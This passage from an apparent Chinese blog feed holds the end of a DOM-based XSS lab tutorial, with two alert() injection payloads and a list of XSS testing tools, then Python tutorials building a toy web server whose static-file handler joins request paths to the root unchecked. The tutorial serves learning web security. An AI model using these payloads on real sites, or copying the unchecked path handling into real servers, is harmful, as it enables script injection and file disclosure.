alt=""></p><ul><li>步骤二：F12审查源码</li></ul><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20411xss14.png" alt=""></p><ul><li>步骤三：审查domxss()函数</li></ul><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20411xss15.png" alt=""></p><pre><code>分析：JS代码，定义了一个domxss函数，利用 window.location.search 获取浏览器中URL的内容，然后赋值给 str，然后经过URL解码和字符串分隔，取出URL中的参数内容，再把 “+” 替换为 “ ”（空格），赋值给 xss最后把 xss 拼接到 a 标签中，然后写到 Id 为 dom 的 div 标签中；跟前面的DOM型xss不同的是，它的输入是从浏览器的URL中获取的，很像反射型XSS(get)</code></pre><ul><li>步骤四：构造payload：<code>#&#39; onclick=&quot;alert(&#39;xss&#39;)&quot;&gt;</code></li></ul><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20411xss16.png" alt=""></p><ul><li>尝试payload：<code>#&#39;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#39;xss&#39;)&quot;&gt;</code></li></ul><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20411xss17.png" alt=""></p><h2 id="0x04-XSS辅助测试工具"><a href="#0x04-XSS辅助测试工具" class="headerlink" title="0x04 XSS辅助测试工具"></a>0x04 XSS辅助测试工具</h2><h3 id="4-1-BeEF"><a href="#4-1-BeEF" class="headerlink" title="4.1 BeEF"></a>4.1 BeEF</h3><p><a href="http://beefproject.com" target="_blank" rel="noopener">http://beefproject.com</a></p><h3 id="4-2-XSS’OR"><a href="#4-2-XSS’OR" class="headerlink" title="4.2 XSS’OR"></a>4.2 XSS’OR</h3><p><a href="http://xssor.io" target="_blank" rel="noopener">http://xssor.io</a></p><h3 id="4-3-IE-Tester"><a href="#4-3-IE-Tester" class="headerlink" title="4.3 IE Tester"></a>4.3 IE Tester</h3><p><a href="https://www.my-debugbar.com/wiki/IETester/HomePage" target="_blank" rel="noopener">https://www.my-debugbar.com/wiki/IETester/HomePage</a></p><h3 id="等等……"><a href="#等等……" class="headerlink" title="等等…….."></a>等等……..</h3><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="http://blog.nsfocus.net/xss-start-finish/#34" target="_blank" rel="noopener">http://blog.nsfocus.net/xss-start-finish/#34</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【python-Web服务器】1.6 python-Web服务器框架-实现</title>
      <link href="2020/04/10/1.6%20python-Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%A1%86%E6%9E%B6-%E5%AE%9E%E7%8E%B0/"/>
      <url>2020/04/10/1.6%20python-Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%A1%86%E6%9E%B6-%E5%AE%9E%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>本文主要内容：将Web框架和Web服务器结合实现简单的服务器，及相关python知识的了解</p><a id="more"></a><h3 id="0x01-服务器代码（MyWebServer-py）"><a href="#0x01-服务器代码（MyWebServer-py）" class="headerlink" title="0x01 服务器代码（MyWebServer.py）"></a>0x01 服务器代码（MyWebServer.py）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process</span><br><span class="line"><span class="keyword">from</span> MyWebFramework <span class="keyword">import</span> Application</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置静态文件根目录</span></span><br><span class="line">HTML_ROOT_DIR = <span class="string">"./html"</span></span><br><span class="line"></span><br><span class="line">WSGI_PYTHON_DIR = <span class="string">"./wsgipython"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HTTPServer</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="string">""""""</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, application)</span>:</span></span><br><span class="line">        <span class="string">"""构造函数， application指的是框架的app"""</span></span><br><span class="line">        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">        self.app = application</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">start</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.server_socket.listen(<span class="number">128</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            client_socket, client_address = self.server_socket.accept()</span><br><span class="line">            <span class="comment"># print("[%s, %s]用户连接上了" % (client_address[0],client_address[1]))</span></span><br><span class="line">            print(<span class="string">"[%s, %s]用户连接上了"</span> % client_address)</span><br><span class="line">            handle_client_process = Process(target=self.handle_client, args=(client_socket,))</span><br><span class="line">            handle_client_process.start()</span><br><span class="line">            client_socket.close()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">start_response</span><span class="params">(self, status, headers)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">         status = "200 OK"</span></span><br><span class="line"><span class="string">    headers = [</span></span><br><span class="line"><span class="string">        ("Content-Type", "text/plain")</span></span><br><span class="line"><span class="string">    ]</span></span><br><span class="line"><span class="string">    star</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        response_headers = <span class="string">"HTTP/1.1 "</span> + status + <span class="string">"\r\n"</span></span><br><span class="line">        <span class="keyword">for</span> header <span class="keyword">in</span> headers:</span><br><span class="line">            response_headers += <span class="string">"%s: %s\r\n"</span> % header</span><br><span class="line"></span><br><span class="line">        self.response_headers = response_headers</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_client</span><span class="params">(self, client_socket)</span>:</span></span><br><span class="line">        <span class="string">"""处理客户端请求"""</span></span><br><span class="line">        <span class="comment"># 获取客户端请求数据</span></span><br><span class="line">        request_data = client_socket.recv(<span class="number">1024</span>)</span><br><span class="line">        print(<span class="string">"request data:"</span>, request_data)</span><br><span class="line">        request_lines = request_data.splitlines()</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> request_lines:</span><br><span class="line">            print(line)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 解析请求报文</span></span><br><span class="line">        <span class="comment"># 'GET / HTTP/1.1'</span></span><br><span class="line">        request_start_line = request_lines[<span class="number">0</span>]</span><br><span class="line">        <span class="comment"># 提取用户请求的文件名</span></span><br><span class="line">        print(<span class="string">"*"</span> * <span class="number">10</span>)</span><br><span class="line">        print(request_start_line.decode(<span class="string">"utf-8"</span>))</span><br><span class="line">        file_name = re.match(<span class="string">r"\w+ +(/[^ ]*) "</span>, request_start_line.decode(<span class="string">"utf-8"</span>)).group(<span class="number">1</span>)</span><br><span class="line">        method = re.match(<span class="string">r"(\w+) +/[^ ]* "</span>, request_start_line.decode(<span class="string">"utf-8"</span>)).group(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        env = &#123;</span><br><span class="line">            <span class="string">"PATH_INFO"</span>: file_name,</span><br><span class="line">            <span class="string">"METHOD"</span>: method</span><br><span class="line">        &#125;</span><br><span class="line">        response_body = self.app(env, self.start_response)</span><br><span class="line"></span><br><span class="line">        response = self.response_headers + <span class="string">"\r\n"</span> + response_body</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 向客户端返回响应数据</span></span><br><span class="line">        client_socket.send(bytes(response, <span class="string">"utf-8"</span>))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 关闭客户端连接</span></span><br><span class="line">        client_socket.close()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">bind</span><span class="params">(self, port)</span>:</span></span><br><span class="line">        self.server_socket.bind((<span class="string">""</span>, port))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    sys.path.insert(<span class="number">1</span>, WSGI_PYTHON_DIR)</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        sys.exit(<span class="string">"python MyWebServer.py Module:app"</span>)</span><br><span class="line">    <span class="comment"># python MyWebServer.py  MyWebFrameWork:app</span></span><br><span class="line">    module_name, app_name = sys.argv[<span class="number">1</span>].split(<span class="string">":"</span>)</span><br><span class="line">    <span class="comment"># module_name = "MyWebFrameWork"</span></span><br><span class="line">    <span class="comment"># app_name = "app"</span></span><br><span class="line">    m = __import__(module_name)</span><br><span class="line">    app = getattr(m, app_name)</span><br><span class="line">    http_server = HTTPServer(app)</span><br><span class="line">    <span class="comment"># http_server.set_port</span></span><br><span class="line">    http_server.bind(<span class="number">8000</span>)</span><br><span class="line">    http_server.start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h4 id="1-1-sys-argv"><a href="#1-1-sys-argv" class="headerlink" title="1.1 sys.argv"></a>1.1 sys.argv</h4><ul><li><p><code>sys.argv[]</code></p><blockquote><p>一个从程序外部获取参数的桥梁,外部参数不唯一，所以sys.argv以列表形式存储参数；其第一个元素是程序本身，随后才依次是外部给予的参数</p></blockquote></li><li><p>简单测试</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#本测试是在jupyter notebook中测试</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.argv</span><br></pre></td></tr></table></figure><pre><code>[&apos;c:\\users\\fishmouse\\appdata\\local\\programs\\python\\python37\\lib\\site-packages\\ipykernel_launcher.py&apos;, &apos;-f&apos;, &apos;C:\\Users\\fishmouse\\AppData\\Roaming\\jupyter\\runtime\\kernel-049997d2-f810-4826-9743-6db3b4d2e9ea.json&apos;]</code></pre><ul><li>本地测试</li></ul><p>测试代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">b=sys.argv</span><br><span class="line">print(b)</span><br></pre></td></tr></table></figure><ul><li><p>测试结果(第三个输出原因是在测试代码中打印了b[0])<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20410python01.png" alt=""></p></li><li><p>Pycharm为当前程序添加（python MyWebServer.py）的参数</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20410web01.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20410web02.png" alt=""></p><h3 id="0x02-Web框架代码（MyWebFramework-py）"><a href="#0x02-Web框架代码（MyWebFramework-py）" class="headerlink" title="0x02 Web框架代码（MyWebFramework.py）"></a>0x02 Web框架代码（MyWebFramework.py）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># from MyWebServer import HTTPServer</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置静态文件根目录</span></span><br><span class="line">HTML_ROOT_DIR = <span class="string">"./html"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Application</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="string">"""框架的核心部分，也就是框架的主题程序，框架是通用的"""</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, urls)</span>:</span></span><br><span class="line">        <span class="comment"># 设置路由信息</span></span><br><span class="line">        self.urls = urls</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__call__</span><span class="params">(self, env, start_response)</span>:</span></span><br><span class="line">        path = env.get(<span class="string">"PATH_INFO"</span>, <span class="string">"/"</span>)</span><br><span class="line">        <span class="comment"># /static/index.html</span></span><br><span class="line">        <span class="keyword">if</span> path.startswith(<span class="string">"/static"</span>):</span><br><span class="line">            <span class="comment"># 要访问静态文件</span></span><br><span class="line">            file_name = path[<span class="number">7</span>:]</span><br><span class="line">            <span class="comment"># 打开文件，读取内容</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                file = open(HTML_ROOT_DIR + file_name, <span class="string">"rb"</span>)</span><br><span class="line">            <span class="keyword">except</span> IOError:</span><br><span class="line">                <span class="comment"># 代表未找到路由信息，404错误</span></span><br><span class="line">                status = <span class="string">"404 Not Found"</span></span><br><span class="line">                headers = []</span><br><span class="line">                start_response(status, headers)</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"not found"</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                file_data = file.read()</span><br><span class="line">                file.close()</span><br><span class="line"></span><br><span class="line">                status = <span class="string">"200 OK"</span></span><br><span class="line">                headers = []</span><br><span class="line">                start_response(status, headers)</span><br><span class="line">                <span class="keyword">return</span> file_data.decode(<span class="string">"utf-8"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> url, handler <span class="keyword">in</span> self.urls:</span><br><span class="line">            <span class="comment">#("/ctime", show_ctime)</span></span><br><span class="line">            <span class="keyword">if</span> path == url:</span><br><span class="line">                <span class="keyword">return</span> handler(env, start_response)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 代表未找到路由信息，404错误</span></span><br><span class="line">        status = <span class="string">"404 Not Found"</span></span><br><span class="line">        headers = []</span><br><span class="line">        start_response(status, headers)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"not found"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_ctime</span><span class="params">(env, start_response)</span>:</span></span><br><span class="line">    status = <span class="string">"200 OK"</span></span><br><span class="line">    headers = [</span><br><span class="line">        (<span class="string">"Content-Type"</span>, <span class="string">"text/plain"</span>)</span><br><span class="line">    ]</span><br><span class="line">    start_response(status, headers)</span><br><span class="line">    <span class="keyword">return</span> time.ctime()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">say_hello</span><span class="params">(env, start_response)</span>:</span></span><br><span class="line">    status = <span class="string">"200 OK"</span></span><br><span class="line">    headers = [</span><br><span class="line">        (<span class="string">"Content-Type"</span>, <span class="string">"text/plain"</span>)</span><br><span class="line">    ]</span><br><span class="line">    start_response(status, headers)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"hello world"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">say_haha</span><span class="params">(env, start_response)</span>:</span></span><br><span class="line">    status = <span class="string">"200 OK"</span></span><br><span class="line">    headers = [</span><br><span class="line">        (<span class="string">"Content-Type"</span>, <span class="string">"text/plain"</span>)</span><br><span class="line">    ]</span><br><span class="line">    start_response(status, headers)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"hello big world"</span></span><br><span class="line"></span><br><span class="line">urls = [</span><br><span class="line">            (<span class="string">"/"</span>, show_ctime),</span><br><span class="line">            (<span class="string">"/ctime"</span>, show_ctime),</span><br><span class="line">            (<span class="string">"/sayhello"</span>, say_hello),</span><br><span class="line">            (<span class="string">"/sayhaha"</span>, say_haha),</span><br><span class="line">        ]</span><br><span class="line">app = Application(urls)</span><br><span class="line"><span class="comment"># if __name__ == "__main__":</span></span><br><span class="line"><span class="comment">#     urls = [</span></span><br><span class="line"><span class="comment">#             ("/", show_ctime),</span></span><br><span class="line"><span class="comment">#             ("/ctime", show_ctime),</span></span><br><span class="line"><span class="comment">#             ("/sayhello", say_hello),</span></span><br><span class="line"><span class="comment">#             ("/sayhaha", say_haha),</span></span><br><span class="line"><span class="comment">#         ]</span></span><br><span class="line"><span class="comment">#     app = Application(urls)</span></span><br><span class="line"><span class="comment">#     http_server = HTTPServer(app)</span></span><br><span class="line"><span class="comment">#     http_server.bind(8000)</span></span><br><span class="line"><span class="comment">#     http_server.start()</span></span><br></pre></td></tr></table></figure><h4 id="2-1-call"><a href="#2-1-call" class="headerlink" title="2.1 __call__"></a>2.1 <code>__call__</code></h4><ul><li>在Python中，函数其实是一个对象：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">f=abs</span><br><span class="line">f.__name__</span><br></pre></td></tr></table></figure><pre><code>&apos;abs&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f(<span class="number">-123</span>)</span><br></pre></td></tr></table></figure><pre><code>123由于 f 可以被调用，所以，f 被称为可调用对象。所有的函数都是可调用对象。一个类实例也可以变成一个可调用对象，只需要实现一个特殊方法__call__()。</code></pre><ul><li>我们把 Person 类变成一个可调用对象：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name, gender)</span>:</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.gender = gender</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__call__</span><span class="params">(self, friend)</span>:</span></span><br><span class="line">        print(<span class="string">'My name is %s...'</span> % self.name)</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">'My friend is %s...'</span> % friend)</span><br></pre></td></tr></table></figure><ul><li>可以对 Person 实例直接调用：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p = Person(<span class="string">'Bob'</span>, <span class="string">'male'</span>)</span><br><span class="line">p(<span class="string">"Tim"</span>)</span><br></pre></td></tr></table></figure><pre><code>My name is Bob...My friend is Tim...单看 p(&apos;Tim&apos;) 你无法确定 p 是一个函数还是一个类实例，所以，在Python中，函数也是对象，对象和函数的区别并不显著。</code></pre><h3 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果"></a>测试结果</h3><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20410web03.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> Web服务器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【python-Web服务器】1.4 python-Web静态服务器-3-使用类</title>
      <link href="2020/04/08/1.4%20python-Web%E9%9D%99%E6%80%81%E6%9C%8D%E5%8A%A1%E5%99%A8-3-%E4%BD%BF%E2%BD%A4%E7%B1%BB/"/>
      <url>2020/04/08/1.4%20python-Web%E9%9D%99%E6%80%81%E6%9C%8D%E5%8A%A1%E5%99%A8-3-%E4%BD%BF%E2%BD%A4%E7%B1%BB/</url>
      
        <content type="html"><![CDATA[<h2 id="本文主要内容"><a href="#本文主要内容" class="headerlink" title="本文主要内容"></a>本文主要内容</h2><ul><li>文件打开方式，文本与二进制区别</li><li>用类封装简单的Web静态服务器</li></ul><a id="more"></a><h2 id="0x01-文件打开方式，文本与二进制区别"><a href="#0x01-文件打开方式，文本与二进制区别" class="headerlink" title="0x01 文件打开方式，文本与二进制区别"></a>0x01 文件打开方式，文本与二进制区别</h2><blockquote><p>文本文件，操作系统会对<code>\n</code>进行一些隐式变换，因此文本文件直接跨平台使用会出问题。<br>在Windows下，写入<code>\n</code>时，操作系统会隐式的将<code>\n</code>转换为<code>\r\n</code>，再写入到文件中；读的时候，会把<code>\r\n</code>隐式转化为<code>\n</code>，再读到变量中。<br>在Linux下，写入’\n’时，操作系统不做隐式变换。<br>二进制文件，操作系统不会对<code>\n</code>进行隐式变换，很多二进制文件（如电影、图片等）可以跨平台使用。</p></blockquote><ul><li>以二进制形式写入wb文件</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">f= open(<span class="string">"wb"</span>,<span class="string">"wb"</span>)</span><br><span class="line">f.write(<span class="string">b"hello\nhello"</span>)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><ul><li>以文本方式写入w文件</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">f= open(<span class="string">"w"</span>,<span class="string">"w"</span>)</span><br><span class="line">f.write(<span class="string">"hello\nhello"</span>)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>使用Notepad++打开wb和w文件显示并无任何区别</p><ul><li>分别读取观察,发现windows中文本读取将<code>\n</code>变为<code>\r\n</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">"wb"</span>,<span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    print(f.read())</span><br></pre></td></tr></table></figure><pre><code>b&apos;hello\nhello&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">"w"</span>,<span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    print(f.read())</span><br></pre></td></tr></table></figure><pre><code>b&apos;hello\r\nhello&apos;</code></pre><h2 id="0x02-python使用类封装Web静态服务器"><a href="#0x02-python使用类封装Web静态服务器" class="headerlink" title="0x02 python使用类封装Web静态服务器"></a>0x02 python使用类封装Web静态服务器</h2><ul><li>代码</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">HTML_ROOT_DIR = <span class="string">"./html"</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HTTPserver</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="string">"""init"""</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">start</span><span 